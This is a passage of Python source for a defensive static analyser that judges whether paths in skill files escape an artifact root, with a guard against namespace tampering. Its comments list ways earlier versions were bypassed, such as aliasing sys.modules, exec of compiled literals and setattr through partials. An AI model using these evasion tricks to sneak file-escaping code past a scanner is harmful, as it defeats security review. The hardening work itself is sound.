    if isinstance(v, _ContainmentPV):
        return v
    if isinstance(v, _ContainmentStr):
        return _containment_parse_lit(v.s)
    if isinstance(v, _ContainmentSafe):
        return _containment_pv("rel", comps=(_CONTAINMENT_SAFE_MARK,), why="bare directory entry (CWD-relative)")
    if isinstance(v, _ContainmentCat):
        return _containment_cat_to_path(v.pieces)
    if isinstance(v, _ContainmentOpq):
        return _containment_pv("unknown", obf=(v.kind == "static"), why=f"{v.kind}: {v.why}")
    return _containment_pv("unknown", why="sequence used as a path")


def _containment_glue(base, piece):
    """String-concatenate one more piece onto an already-rooted path (no separator
    semantics are invented: text glued with no leading '/' REPLACES the last
    component -- see the module comment's G3 example)."""
    if base.root not in ("anchor", "rel"):
        return base  # absolute/home/cwd/unknown root: the tail cannot re-anchor it
    if isinstance(piece, _ContainmentStr):
        t = piece.s.replace("\\", "/")
        if t == "":
            return base
        if base.trailing or t.startswith("/"):
            comps, tr = _containment_split_lit(t)
            return _containment_push(base, comps, trailing=tr)
        head, _, tail = t.partition("/")
        b = _containment_pop(base, glue=True)
        b = _containment_push(b, [_CONTAINMENT_GLUE] if head not in ("", ".") else [])
        comps, tr = _containment_split_lit(tail) if tail else ([], False)
        return _containment_push(b, comps, trailing=tr or t.endswith("/"))
    if isinstance(piece, _ContainmentOpq):
        mark = dict(obf=True) if piece.kind == "static" else dict(unk=True)
        b = base if base.trailing else _containment_pop(base, glue=True)
        return _containment_push(b, [_CONTAINMENT_UNK], **mark)
    if isinstance(piece, _ContainmentSafe):
        if base.trailing:
            return _containment_push(base, [_CONTAINMENT_SAFE_MARK])
        return _containment_push(_containment_pop(base, glue=True), [_CONTAINMENT_GLUE])
    return _containment_push(base, [_CONTAINMENT_UNK], unk=True)  # a whole path embedded mid-string


def _containment_cat_to_path(pieces):
    merged = []
    for p in pieces:
        if isinstance(p, _ContainmentStr) and merged and isinstance(merged[-1], _ContainmentStr):
            merged[-1] = _ContainmentStr(merged[-1].s + p.s)
        else:
            merged.append(p)
    while merged and isinstance(merged[0], _ContainmentStr) and merged[0].s == "":
        merged.pop(0)
    if not merged:
        return _containment_pv("rel", why="empty string")
    first, rest = merged[0], merged[1:]
    if isinstance(first, _ContainmentStr):
        base = _containment_parse_lit(first.s)
    else:
        base = _containment_as_path(first)
    for p in rest:
        base = _containment_glue(base, p)
    return base


def _containment_pop(p, glue=False):
    """Lexical last-component removal (os.path.dirname / pathlib .parent)."""
    if p.root not in ("anchor", "rel"):
        return p
    if p.comps:
        popped = p.comps[-1]
        return p._replace(comps=p.comps[:-1], trailing=False, unk=p.unk or popped == _CONTAINMENT_UNK)
    if p.root == "anchor":
        return p._replace(up=p.up + 1, trailing=False)
    return p  # dirname of a bare relative name is ""


def _containment_dirname(v, style):
    p = _containment_as_path(v)
    if style == "os" and p.trailing and p.root in ("anchor", "rel"):
        return p._replace(trailing=False)  # dirname('/a/b/') == '/a/b'
    return _containment_pop(p)


def _containment_normalize(v, absolutize):
    p = _containment_as_path(v)
    if p.root == "rel" and absolutize:
        return _containment_pv("cwd", why="relative path absolutized against the CWD")
    if p.root not in ("anchor", "rel"):
        return p
    out, up = [], p.up
    seen_unk = False
    for c in p.comps:
        if c == _CONTAINMENT_UNK:
            seen_unk = True
            out.append(c)
        elif c == ".." and not seen_unk:
            if out:
                out.pop()
            elif p.root == "anchor":
                up += 1
            else:
                out.append(c)
        else:
            out.append(c)
    return p._replace(comps=tuple(out), up=up, trailing=False)


def _containment_is_harmless_prefix(p):
    return p.root in ("cwd", "rel") and not p.comps


def _containment_join(values, style):
    res, harmless = None, True
    for v in values:
        if isinstance(v, _ContainmentStr) and (v.s == "" or (style == "pathlib" and v.s == ".")):
            if res is None:
                res = _containment_pv("rel", why="empty leading join operand")
            elif style == "os" and v.s == "":
                res = res._replace(trailing=True)
            continue
        p = _containment_as_path(v)
        if res is None:
            res, harmless = p, _containment_is_harmless_prefix(p)
            continue
        if p.root in ("abs", "home", "cwd"):
            res, harmless = p, _containment_is_harmless_prefix(p)   # join() discards what came before
            continue
        if p.root == "anchor":
            res, harmless = p, False   # absolute: join() discards everything before it
            continue
        if p.root == "rel":
            res = _containment_push(res, p.comps, trailing=p.trailing if style == "os" else False,
                                     unk=p.unk, obf=p.obf)
            harmless = harmless and not p.comps
            continue
        res = _containment_push(res, [_CONTAINMENT_UNK], unk=not p.obf, obf=p.obf)   # may be absolute
        harmless = False
    if res is None:
        res = _containment_pv("rel", why="empty join")
    return res._replace(trailing=False) if style == "pathlib" else res


def _containment_expanduser(v):
    p = _containment_as_path(v)
    if p.root == "rel" and p.comps and p.comps[0].startswith("~"):
        return _containment_pv("home", why="home-relative path")
    return p


def _containment_verdict(p, depth_known):
    if p.root != "anchor":
        return _CONTAINMENT_NOT_ANCHORED, f"root is not the __file__ anchor ({p.why or p.root})"
    if p.obf:
        return _CONTAINMENT_ESCAPES, "a segment is a static value hidden behind an unfoldable expression"
    if p.up > 0:
        if depth_known:
            return _CONTAINMENT_ESCAPES, f"climbs {p.up} level(s) above the artifact root"
        return _CONTAINMENT_UNPROVEN, "climbs above the file's own directory and the file's depth is unknown"
    depth, seen_unk = 0, p.unk
    for c in p.comps:
        if c == _CONTAINMENT_UNK:
            # B-850 round 2: count a runtime-computed segment as exactly one level of
            # depth -- its WORST case (a real subdirectory name, not itself a '..').
            # Restores the pre-B-850 baseline's conviction on
            # `join(here, os.environ.get(K, ''), '..', '..', '..', 'x.py')`: a '..'
            # walk that still goes negative even under that generous one-level credit
            # is a PROVEN escape regardless of what the runtime segment turns out to
            # be, not merely an UNPROVEN one -- only "depth unknown" still downgrades.
            seen_unk = True
            depth += 1
        elif c == "..":
            depth -= 1
            if depth < 0:
                if not depth_known:
                    return _CONTAINMENT_UNPROVEN, "climbs above the root and the file's depth is unknown"
                return _CONTAINMENT_ESCAPES, (
                    "a '..' walk climbs above the artifact root even crediting every "
                    "runtime-computed segment as one level deep"
                )
        else:
            depth += 1
    if seen_unk:
        return _CONTAINMENT_UNPROVEN, "anchored, but a segment is computed at runtime"
    return _CONTAINMENT_BOUNDED, "anchored and every segment is a literal that stays inside"


# ---- module context: imports, scopes, reaching definitions -----------------------
_CONTAINMENT_PATHLIB_CLASSES = {
    "Path", "PurePath", "PosixPath", "PurePosixPath", "WindowsPath", "PureWindowsPath",
}
_CONTAINMENT_OS_CONSTS = {"pardir": "..", "curdir": ".", "sep": "/", "altsep": "/"}
_CONTAINMENT_SCOPES = (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda, ast.ClassDef)
_CONTAINMENT_COMP_TYPES = (ast.ListComp, ast.SetComp, ast.GeneratorExp, ast.DictComp)
_CONTAINMENT_FOLDABLE_STR_METHODS = {
    "format", "replace", "strip", "lstrip", "rstrip", "lower", "upper",
    "removeprefix", "removesuffix", "casefold",
}
# B-850 round 2: a small allowlist of genuinely pure/static functions (content
# decoders and plain char/str primitives) that `_containment_staticness` still treats
# as 'static' -- every OTHER imported call is 'runtime' now, closing the false-ESCAPES
# family where a benign runtime idiom (`platform.system().lower()`, `os.getenv(...)`)
# got folded into a single 'static' opaque and then read as "a static value hidden
# behind an unfoldable expression".
_CONTAINMENT_PURE_FUNCS = frozenset({
    "base64.b64decode", "base64.b64encode", "base64.b32decode", "base64.b32encode",
    "base64.b16decode", "base64.b16encode", "base64.b85decode", "base64.b85encode",
    "base64.a85decode", "base64.a85encode", "base64.decodebytes", "base64.encodebytes",
    "binascii.a2b_base64", "binascii.b2a_base64", "binascii.unhexlify", "binascii.hexlify",
    "builtins.bytes.fromhex", "builtins.chr", "builtins.ord",
    "zlib.decompress", "zlib.compress", "gzip.decompress", "gzip.compress",
    "bz2.decompress", "bz2.compress", "lzma.decompress", "lzma.compress",
    "codecs.decode", "codecs.encode",
})
# B-850 round 3: functions that read HOST/ENVIRONMENT state -- their result is NOT
# determined by their (possibly-literal) arguments alone, so a call to one of these
# always stays 'runtime' regardless of what it's given. This is narrower than "every
# resolvable call not in PURE_FUNCS": an ordinary deterministic transform of literal
# arguments (`''.join(reversed('lit'))`, `bytes([...]).decode()`, `urllib.parse.
# unquote('lit')`, `json.loads('lit')`, `operator.add('a', 'b')`, `textwrap.
# dedent('lit')`, ...) is just as foldable-in-principle as the PURE_FUNCS decoders and
# must stay 'static' (closing the false-ESCAPES-downgraded-to-WARN regression, D1-D8) --
# only a call that reads something OUTSIDE its own arguments (the host OS, the clock,
# a random source, ...) may legitimately vary at runtime. A resolvable call that takes
# NO arguments at all is always treated the same way (an environment-probe shape, e.g.
# `os.getcwd()`), whether or not it's separately listed here.
_CONTAINMENT_IMPURE_CALLS = frozenset({
    "platform.system", "platform.release", "platform.machine", "platform.version",
    "platform.platform", "platform.node", "platform.processor", "platform.uname",
    "platform.architecture", "os.getcwd", "os.getlogin", "os.urandom",
    "time.time", "time.time_ns", "time.localtime", "time.gmtime", "time.perf_counter",
    "time.monotonic", "datetime.datetime.now", "datetime.date.today",
    "uuid.uuid4", "uuid.uuid1", "socket.gethostname", "socket.getfqdn",
    "random.random", "random.randint", "random.choice", "random.randrange",
    "random.choices", "random.sample", "getpass.getuser",
    # B-850 round 4: secrets.* is semantically identical to random.* here (a
    # host-randomness read, not a pure function of its literal arguments) --
    # secrets.choice(['a.py', 'b.py']) was wrongly folded 'static' (ESCAPES)
    # instead of 'runtime' (UNPROVEN) purely because it wasn't spelled random.*.
    "secrets.choice", "secrets.randbelow", "secrets.randbits",
    "secrets.token_bytes", "secrets.token_hex", "secrets.token_urlsafe",
})
# Environment variables whose value is absolute by construction (a real filesystem
# root the OS/shell sets up) -- a read of one of these is modelled as an absolute-path
# SOURCE, not an ordinary runtime unknown, so `os.path.join(here, os.environ['HOME'],
# ...)` is NOT_ANCHORED (never exempt) rather than a merely-UNPROVEN anchored read.
_CONTAINMENT_ABS_ENV_VARS = frozenset({
    "HOME", "TMPDIR", "TMP", "TEMP", "PWD", "USERPROFILE", "APPDATA",
})
_ContainmentDef = namedtuple("_ContainmentDef", "kind node extra scope")

# B-850 round 2/3: fail-closed namespace/monkeypatch guard. A skill that rebinds
# `__file__`, reaches into `globals`/`vars`/`locals`/`setattr`/`delattr`/`__dict__`/
# `__builtins__`/`sys.modules`/`__code__`/`__defaults__`/`__kwdefaults__`/`__globals__`,
# reassigns one of the trusted path primitives this very recognizer trusts (`os.path.
# join`, `dirname`, `builtins.open`, ...), does `import *`, or calls `exec`/`eval` on a
# string literal, has a namespace the static analysis cannot trust at all -- every
# other recognizer decision in this module assumes `__file__`/`os.path.*`/`sys.*` mean
# what they normally mean. Rather than chase each such primitive as its own bypass (six
# C-135 rounds already did that for the blocklist this module replaced), one guard caps
# the WHOLE file's verdict at NOT_ANCHORED -- never a silent exemption -- computed once
# per `_ContainmentCtx` and consulted by `_containment_classify_decode`, the sole entry
# point every public wrapper funnels through.
#
# B-850 round 3 (C-135 rejection of 2b4d6dc2): the guard used to match by NAME SPELLING
# -- any Store/Del of an attribute spelled `join`/`open`/`path`/... regardless of the
# base object, and a fixed handful of bare-Name spellings (`setattr`, `globals`, ...).
# That is what a `self.path = p` / `setattr(self, k, v)` / `self.__dict__.update(kw)`
# false-FAIL family looks like -- entirely ordinary code, no module in sight -- AND it
# is bypassable by any spelling the six prior rounds didn't happen to enumerate
# (`os.path.__setattr__(...)`, `sys.modules` under an alias, `exec(compile(...))`, ...).
# The guard is now RESOLUTION-based: a Store/Del or a setattr-family mutation only
# fires when its TARGET actually resolves -- through the engine's own import/alias
# tracking, extended here to also chase plain reassignment aliasing (`m = sys`) -- to a
# sensitive namespace (`_CONTAINMENT_SENSITIVE_MODULES`, a class pulled from one of
# them, or a module reached dynamically via `sys.modules`/`importlib`/`__import__`
# under any alias). `self`/an arbitrary local object never resolves to one of these, so
# it never fires; `os.path`/`sys`/`builtins`/`pathlib`, however spelled or indirected,
# always does.
_CONTAINMENT_SENSITIVE_MODULES = ("os", "os.path", "sys", "builtins", "pathlib")
_CONTAINMENT_NAMESPACE_CALL_NAMES = frozenset({"globals", "vars", "locals"})
_CONTAINMENT_NAMESPACE_MUTATORS = frozenset({"update", "clear", "pop", "popitem", "setdefault"})
_CONTAINMENT_MUTATOR_DUNDER_ATTRS = frozenset({
    "__setattr__", "__delattr__", "__setitem__", "__delitem__",
})
_CONTAINMENT_MUTATOR_NAMES = frozenset({"setattr", "delattr"})
# `__dict__` and a subscript-store are gated on the same fail-closed
# `_containment_mutation_base_is_risky` combinator as the attribute Store/Del and
# setattr/delattr mutator-target gates below (round 5, C-135 rejection of 9fc20cc9:
# round 4 flipped those two gates to the ambiguous-fires combinator but left these two
# on the narrower `_containment_sensitive_base`, which only fires on FULL resolution and
# has no fallback for an unresolvable target like a function parameter or a cross-method
# `self.attr` -- reopening the exact G1/G2/G3 shapes round 4 supposedly closed, just
# spelled with `.__dict__[...]`/`[...]` instead of plain `attr = value`). `self`/an
# ordinary local still never fires (round 3: `self.__dict__.update(kw)` is ordinary
# code); the other four dunder attrs are never legitimately touched on ANY object in
# benign skill code, so they stay unconditional.
_CONTAINMENT_UNSAFE_DUNDER_ATTRS = frozenset({
    "__code__", "__defaults__", "__kwdefaults__", "__globals__",
})
_CONTAINMENT_TRUSTED_ATTRS = frozenset({
    "join", "dirname", "abspath", "realpath", "normpath", "split", "expanduser",
    "fspath", "getcwd", "listdir", "glob", "iglob", "rglob", "iterdir", "open",
    "path", "_MEIPASS", "frozen", "__file__", "sep", "altsep", "curdir", "pardir",
    "parent", "__truediv__", "str",
})


def _containment_dunder_file_subscript_key(slice_node):
    s = slice_node
    if s.__class__.__name__ == "Index":  # Python <=3.8 subscript wrapper compat
        s = s.value
    return isinstance(s, ast.Constant) and s.value == "__file__"


def _containment_dotted_is_sensitive(d):
    if d is None:
        return False
    return any(d == m or d.startswith(m + ".") for m in _CONTAINMENT_SENSITIVE_MODULES)


def _containment_static_subscript_key(slice_node):
    """A literal str/int subscript key -- Python <=3.8 wraps it in `ast.Index`.
    None (not a static key) for a variable, a slice, an f-string, ... (B-850 round 4,
    H3/H7/H9)."""
    s = slice_node
    if s.__class__.__name__ == "Index":  # Python <=3.8 subscript wrapper compat
        s = s.value
    if isinstance(s, ast.Constant) and isinstance(s.value, (str, int)) and not isinstance(s.value, bool):
        return s.value
    return None


def _containment_container_literal_element(base_node, key):
    """The AST node bound to *key* inside a Dict/List/Tuple LITERAL -- None when
    *base_node* isn't one of these, the key isn't found (Dict), the index is out of
    range, or a `*spread` element makes the position no longer static (List/Tuple)
    (B-850 round 4, H3/H7/H9)."""
    if isinstance(base_node, ast.Dict):
        for k, v in zip(base_node.keys, base_node.values):
            if k is not None and isinstance(k, ast.Constant) and k.value == key:
                return v
        return None
    if isinstance(base_node, (ast.List, ast.Tuple)) and isinstance(key, int):
        elts = base_node.elts
        if any(isinstance(e, ast.Starred) for e in elts):
            return None
        idx = key if key >= 0 else key + len(elts)
        return elts[idx] if 0 <= idx < len(elts) else None
    return None


def _containment_resolve_value_node(ctx, node, env, depth=0):
    """Resolve a Name down to the AST node of its bound VALUE by chasing only
    unambiguous single-reaching-def 'assign' bindings -- unlike
    `_containment_resolve_through_assigns` (which folds an already-dotted chain
    into a STRING), this keeps the raw node so a container LITERAL (Dict/List/
    Tuple) can be matched against a static subscript key one level up (B-850
    round 4, H3/H7/H9)."""
    if depth > 8 or not isinstance(node, ast.Name):
        return node, env
    if env is None:
        env = _ContainmentEnv(ctx, ctx.scope_of(node))
    try:
        defs = _containment_lookup(node, env, frozenset())
    except _ContainmentBudget:
        return None, None
    if len(defs) != 1:
        return None, None
    dd, denv = defs[0]
    if dd.kind != "assign" or dd.node is None:
        return None, None
    return _containment_resolve_value_node(ctx, dd.node, denv, depth + 1)


def _containment_resolve_through_assigns(ctx, node, env, depth=0):
    """Like `ctx.dotted()`, but also chases plain reassignment aliasing (`m = sys`) --
    `ctx.dotted()` only trusts an `import`-kind reaching definition, so an aliased base
    like `m = sys; m._MEIPASS = ...` would otherwise resolve to None (round 3 H9/H10
    coverage, previously gotten for free by the spelling blocklist)."""
    if depth > 8:
        return None
    if isinstance(node, ast.Name):
        d = ctx.dotted(node, env)
        if d is not None:
            return d
        if node.id in ("True", "False", "None"):
            return None
        if env is None:
            env = _ContainmentEnv(ctx, ctx.scope_of(node))
        try:
            defs = _containment_lookup(node, env, frozenset())
        except _ContainmentBudget:
            return None
        targets = set()
        for dd, denv in defs:
            if dd.kind == "assign" and dd.node is not None:
                r = _containment_resolve_through_assigns(ctx, dd.node, denv, depth + 1)
            elif dd.kind == "assign-unpack" and dd.node is not None:
                # B-850 round 4 (H6): `a, b = os.path, sys` binds `a` to element 0
                # of the RHS tuple/list -- only when the shape is fully static (a
                # literal Tuple/List of the same arity, no `*spread`); round 3's
                # resolver only accepted plain "assign", so this fell through as
                # unresolved (fail-OPEN -- see `_containment_target_is_safe` for
                # the round-4 fail-closed side of an unresolved target).
                i, n = dd.extra
                if isinstance(dd.node, (ast.Tuple, ast.List)) and len(dd.node.elts) == n and not any(
                    isinstance(e, ast.Starred) for e in dd.node.elts
                ):
                    r = _containment_resolve_through_assigns(ctx, dd.node.elts[i], denv, depth + 1)
                else:
                    return None
            else:
                return None
            if r is None:
                return None
            targets.add(r)
        return targets.pop() if len(targets) == 1 else None
    if isinstance(node, ast.Attribute):
        base = _containment_resolve_through_assigns(ctx, node.value, env, depth + 1)
        return f"{base}.{node.attr}" if base else None
    if isinstance(node, ast.Subscript):
        # B-850 round 4 (H3/H7/H9): `mods["p"]`/`mods[0]` where `mods` resolves to
        # a Dict/List/Tuple LITERAL and the key/index is itself static -- match the
        # element and keep chasing through it. A dynamic key, a non-literal
        # container, or an out-of-range/starred index is simply unresolved here.
        key = _containment_static_subscript_key(node.slice)
        if key is None:
            return None
        base_node, base_env = _containment_resolve_value_node(ctx, node.value, env, depth + 1)
        elt = _containment_container_literal_element(base_node, key)
        if elt is None:
            return None
        return _containment_resolve_through_assigns(ctx, elt, base_env, depth + 1)
    return None


def _containment_sensitive_base(ctx, node, env=None):
    """True if *node* resolves -- through import-aliasing, plain reassignment
    aliasing, or dynamic `sys.modules[...]`/`importlib.import_module(...)`/
    `__import__(...)` access under any alias -- to a sensitive namespace this
    recognizer trusts: an imported `os`/`os.path`/`sys`/`builtins`/`pathlib` module or
    submodule, or a class pulled from one of them. Never true for a bare `self`/
    instance attribute or an arbitrary local object (B-850 round 3)."""
    if node is None:
        return False
    if _containment_dotted_is_sensitive(_containment_resolve_through_assigns(ctx, node, env)):
        return True
    if isinstance(node, ast.Subscript):
        base_d = _containment_resolve_through_assigns(ctx, node.value, env)
        if base_d == "sys.modules":
            return True
        return _containment_sensitive_base(ctx, node.value, env)
    if isinstance(node, ast.Call):
        fd = _containment_resolve_through_assigns(ctx, node.func, env)
        if fd in ("importlib.import_module", "builtins.__import__"):
            return True
    return False


def _containment_is_namespace_call(ctx, node, env=None):
    """True if *node* is a call to `globals()`/`vars(...)`/`locals()` (any alias) --
    used only to gate NAMESPACE MUTATION (subscript-store, `.update()`, ...): a
    read-only `vars(x)`/`locals()` never fires the guard on its own (B-850 round 3)."""
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if isinstance(func, ast.Name) and func.id in _CONTAINMENT_NAMESPACE_CALL_NAMES:
        return True
    fd = _containment_resolve_through_assigns(ctx, func, env)
    return fd in {"builtins.globals", "builtins.vars", "builtins.locals"}


def _containment_partial_setattr_target(ctx, func, env=None):
    """*func* is a bare Name whose single unambiguous reaching definition is
    `functools.partial(setattr|delattr, X, ...)` (any resolvable spelling of
    `functools.partial`/`partial`, `setattr`/`delattr`) -- returns X, the node to
    sensitivity-check, since a later call through that name (`setter('join', v)`)
    is exactly `setattr(X, 'join', v)`. None when *func* isn't shaped like this
    (B-850 round 4, H4/H14)."""
    if not isinstance(func, ast.Name):
        return None
    if env is None:
        env = _ContainmentEnv(ctx, ctx.scope_of(func))
    try:
        defs = _containment_lookup(func, env, frozenset())
    except _ContainmentBudget:
        return None
    if len(defs) != 1:
        return None
    dd, denv = defs[0]
    if dd.kind != "assign" or not isinstance(dd.node, ast.Call):
        return None
    call = dd.node
    fd = _containment_resolve_through_assigns(ctx, call.func, denv)
    if fd not in ("functools.partial", "functools.partialmethod") or not call.args:
        return None
    first = call.args[0]
    first_fd = _containment_resolve_through_assigns(ctx, first, denv)
    is_setattr_like = (isinstance(first, ast.Name) and first.id in _CONTAINMENT_MUTATOR_NAMES) \
        or first_fd in {"builtins.setattr", "builtins.delattr"}
    if not is_setattr_like or len(call.args) < 2:
        return None
    return call.args[1]


def _containment_mutator_targets(ctx, call, env=None):
    """AST nodes to sensitivity-check for a setattr/delattr/`__setattr__`/
    `__delattr__`/`__setitem__`/`__delitem__` call, however indirected (bound-style
    `X.__setattr__(name, value)`, unbound-via-class `Class.__setattr__(target, name,
    value)`, indirected through `getattr(builtins, 'setattr')(...)`, or through a
    `functools.partial(setattr, X)` alias called later -- B-850 round 4, H4/H14)
    -- every plausible target slot is checked rather than resolving the
    bound-vs-unbound ambiguity, since fail-closed only needs ONE of them to be
    sensitive (B-850 round 3, closes the G1-G19 family without a per-spelling
    special case)."""
    func = call.func
    targets = []
    if isinstance(func, ast.Attribute) and func.attr in _CONTAINMENT_MUTATOR_DUNDER_ATTRS:
        targets.append(func.value)
        if call.args:
            targets.append(call.args[0])
        return targets
    fd = _containment_resolve_through_assigns(ctx, func, env)
    if (isinstance(func, ast.Name) and func.id in _CONTAINMENT_MUTATOR_NAMES) or \
            fd in {"builtins.setattr", "builtins.delattr"}:
        if call.args:
            targets.append(call.args[0])
        return targets
    if isinstance(func, ast.Call):
        inner_fd = _containment_resolve_through_assigns(ctx, func.func, env)
        indirect_getattr = (isinstance(func.func, ast.Name) and func.func.id == "getattr") \
            or inner_fd == "builtins.getattr"
        if indirect_getattr and len(func.args) >= 2 and isinstance(func.args[1], ast.Constant) \
                and isinstance(func.args[1].value, str) \
                and func.args[1].value in (_CONTAINMENT_MUTATOR_DUNDER_ATTRS | _CONTAINMENT_MUTATOR_NAMES):
            if call.args:
                targets.append(call.args[0])
        return targets
    partial_target = _containment_partial_setattr_target(ctx, func, env)
    if partial_target is not None:
        targets.append(partial_target)
    return targets


def _containment_exec_eval_literal_reason(ctx, call, env=None):
    """`exec`/`eval` (any resolvable spelling: bare name, `builtins.exec`, an aliased
    import, ...) called with a string literal, OR with `compile(<literal>, ...)` --
    resolution-based so `builtins.exec("...")` and `exec(compile("...", 'c', 'exec'))`
    close the same way the bare-name/Constant-only shape already did (B-850 round 3,
    G12/G13)."""
    func = call.func
    fname = func.id if isinstance(func, ast.Name) else None
    fd = _containment_resolve_through_assigns(ctx, func, env)
    if not ((fname in ("exec", "eval")) or fd in ("builtins.exec", "builtins.eval")) or not call.args:
        return None
    label = fname or fd.rsplit(".", 1)[-1]
    arg0 = call.args[0]
    if isinstance(arg0, ast.Constant) and isinstance(arg0.value, str):
        return f"{label}() is called with a string literal"
    if isinstance(arg0, ast.Call):
        cfunc = arg0.func
        cfd = _containment_resolve_through_assigns(ctx, cfunc, env)
        is_compile = (isinstance(cfunc, ast.Name) and cfunc.id == "compile") or cfd == "builtins.compile"
        if is_compile and arg0.args and isinstance(arg0.args[0], ast.Constant) \
                and isinstance(arg0.args[0].value, str):
            return f"{label}() is called with compile() of a string literal"
    return None


def _containment_fail_closed_reason(ctx):
    """One whole-file sweep for a namespace-rebinding/monkeypatch primitive (see the
    comment above). Returns a short reason string, or None when the file is clean."""
    for n in ast.walk(ctx.tree):
        if isinstance(n, ast.Name):
            if n.id == "__file__" and isinstance(n.ctx, (ast.Store, ast.Del)):
                return "__file__ is reassigned or deleted"
            if n.id == "__builtins__":
                return "__builtins__ is referenced"
            if n.id == "_getframe":
                return "_getframe() is used"
        elif isinstance(n, ast.Attribute):
            if n.attr in _CONTAINMENT_UNSAFE_DUNDER_ATTRS:
                return f".{n.attr} is used"
            if n.attr in ("f_globals", "_getframe"):
                return f".{n.attr} is used"
            if n.attr == "__dict__" and _containment_mutation_base_is_risky(ctx, n.value):
                return ".__dict__ is used on a sensitive namespace"
            if isinstance(n.ctx, (ast.Store, ast.Del)) and n.attr in _CONTAINMENT_TRUSTED_ATTRS \
                    and _containment_mutation_base_is_risky(ctx, n.value):
                return f".{n.attr} is reassigned or deleted"
        elif isinstance(n, ast.alias):
            if n.asname == "__file__":
                return "__file__ is bound by an import alias"
        elif isinstance(n, ast.ExceptHandler):
            if n.name == "__file__":
                return "__file__ is bound by an except-as target"
        elif n.__class__.__name__ in ("MatchAs", "MatchStar"):
            if getattr(n, "name", None) == "__file__":
                return "__file__ is bound by a match capture"
        elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
            a = n.args
            names = [x.arg for x in a.posonlyargs + a.args + a.kwonlyargs]
            names += [x.arg for x in (a.vararg, a.kwarg) if x]
            if "__file__" in names:
                return "__file__ is a function parameter"
        elif isinstance(n, ast.Subscript):
            if isinstance(n.ctx, (ast.Store, ast.Del)):
                if _containment_dunder_file_subscript_key(n.slice):
                    return "'__file__' is used as a subscript key"
                if _containment_is_namespace_call(ctx, n.value):
                    return "globals()/vars()/locals() namespace is mutated by subscript"
                if _containment_mutation_base_is_risky(ctx, n.value):
                    return "a subscript on a sensitive namespace is assigned or deleted"
        elif isinstance(n, ast.ImportFrom):
            if any(a.name == "*" for a in n.names):
                return "import * is used"
        elif isinstance(n, ast.Call):
            if isinstance(n.func, ast.Attribute) and n.func.attr == "update" and any(
                kw.arg == "__file__" for kw in n.keywords
            ):
                return "'__file__' is used as a .update() key"
            if isinstance(n.func, ast.Attribute) and n.func.attr in _CONTAINMENT_NAMESPACE_MUTATORS \
                    and _containment_is_namespace_call(ctx, n.func.value):
                return f"globals()/vars()/locals() namespace is mutated by .{n.func.attr}()"
            reason = _containment_exec_eval_literal_reason(ctx, n)
            if reason:
                return reason
            for t in _containment_mutator_targets(ctx, n):
                if _containment_mutation_base_is_risky(ctx, t):
                    return "a sensitive namespace's attribute is set/deleted dynamically"
    return None


class _ContainmentCtx:
    """Per-file recognizer context: parent-pointer map (for `scope_of`), import-bound
    canonical names, and one `_ContainmentReachingDefs` per scope (built lazily). Built
    fresh per classified read; not cached across `analyze_python()` calls."""

    def __init__(self, tree: ast.AST, relpath: str):
        self.tree = tree
        parts = [p for p in (relpath or "").replace("\\", "/").split("/") if p not in ("", ".")]
        self.depth_known = bool(parts)
        self.file_comps = tuple(parts) if parts else (_CONTAINMENT_VFILE,)
        self.parent: dict = {}
        for n in ast.walk(tree):
            for c in ast.iter_child_nodes(n):
                self.parent[c] = n
        self._rd: dict = {}
        self._callsites: dict = {}
        self.global_assigns: dict = {}
        self._imports()
        # B-850 round 3: warm up `global_assigns` (reaching defs for every function
        # that declares a `global`) BEFORE the fail-closed sweep -- the sweep now
        # resolves names via `_containment_lookup`/`dotted()` (aliasing, `sys.modules`,
        # ...), which can itself consult `global_assigns`.
        for n in ast.walk(tree):
            if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and any(
                isinstance(m, ast.Global) for m in ast.walk(n)
            ):
                self.rd(n)
        self.fail_closed_reason = _containment_fail_closed_reason(self)

    # ---- which names are the real modules/functions (import-bound, never rebound) ----
    def _imports(self):
        self.canon: dict = {}            # local name -> canonical dotted name
        rebound: set = set()
        for n in ast.walk(self.tree):
            if isinstance(n, ast.Import):
                for a in n.names:
                    if a.asname:
                        self.canon[a.asname] = a.name
                    else:
                        root = a.name.split(".")[0]
                        self.canon[root] = root
            elif isinstance(n, ast.ImportFrom) and n.module and not n.level:
                for a in n.names:
                    self.canon[a.asname or a.name] = f"{n.module}.{a.name}"
            elif isinstance(n, (ast.Assign, ast.AugAssign, ast.AnnAssign, ast.NamedExpr)):
                tgts = n.targets if isinstance(n, ast.Assign) else [n.target]
                for t in tgts:
                    for m in ast.walk(t):
                        if isinstance(m, ast.Name):
                            rebound.add(m.id)
            elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                rebound.add(n.name)
                for a in (
                    n.args.args + n.args.kwonlyargs + n.args.posonlyargs
                    if hasattr(n, "args") else []
                ):
                    rebound.add(a.arg)
            elif isinstance(n, (ast.For, ast.comprehension)):
                for m in ast.walk(n.target):
                    if isinstance(m, ast.Name):
                        rebound.add(m.id)
            elif isinstance(n, ast.withitem) and n.optional_vars is not None:
                for m in ast.walk(n.optional_vars):
                    if isinstance(m, ast.Name):
                        rebound.add(m.id)
        for name in rebound:
            self.canon.pop(name, None)
        self.rebound = rebound
        # sys mutation makes sys._MEIPASS / sys.frozen live rather than dead
        self.sys_mutated = False
        for n in ast.walk(self.tree):
            if isinstance(n, ast.Attribute) and isinstance(n.ctx, (ast.Store, ast.Del)):
                if isinstance(n.value, ast.Name) and self.canon.get(n.value.id) == "sys":
                    self.sys_mutated = True
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in (
                "setattr", "delattr", "vars"
            ):
                self.sys_mutated = True
            if isinstance(n, ast.Attribute) and n.attr == "__dict__":
                self.sys_mutated = True

    def _import_target(self, alias):
        par = self.parent.get(alias)
        if isinstance(par, ast.Import):
            return alias.name if alias.asname else alias.name.split(".")[0]
        if isinstance(par, ast.ImportFrom) and par.module and not par.level:
            return f"{par.module}.{alias.name}"
        return None

    def dotted(self, func, env=None):
        """Canonical dotted name of a callee/attribute when every leg is import-bound
        AT THIS USE SITE (reaching definitions), or an unshadowed builtin."""
        if isinstance(func, ast.Name):
            if env is None:
                env = _ContainmentEnv(self, self.scope_of(func))
            try:
                defs = _containment_lookup(func, env, frozenset())
            except _ContainmentBudget:
                return None
            if not defs:
                return "builtins." + func.id if hasattr(builtins, func.id) else None
            targets = set()
